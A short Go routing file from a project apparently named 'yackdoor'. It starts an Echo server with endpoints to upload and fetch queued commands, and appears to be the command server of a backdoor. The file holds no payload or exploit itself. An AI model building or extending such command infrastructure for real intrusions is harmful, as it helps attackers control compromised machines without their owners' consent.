package router

import (
	"os"

	"github.com/bruh-boys/yackdoor/src/controller"
	"github.com/labstack/echo/v4"
	//"golang.org/x/net/websocket"
)

func SetupRoutes() {
	e := echo.New()
	port, exist := os.LookupEnv("PORT")
	if !exist {
		port = "8080"
	}
	e.POST("/commands", controller.UploadCommand)
	e.GET("/commands", controller.GetCommands)
	e.GET("/", func(c echo.Context) error {
		c.Response().Write([]byte(""))
		return nil
	})

	e.Logger.Fatal(e.Start(":" + port))
}
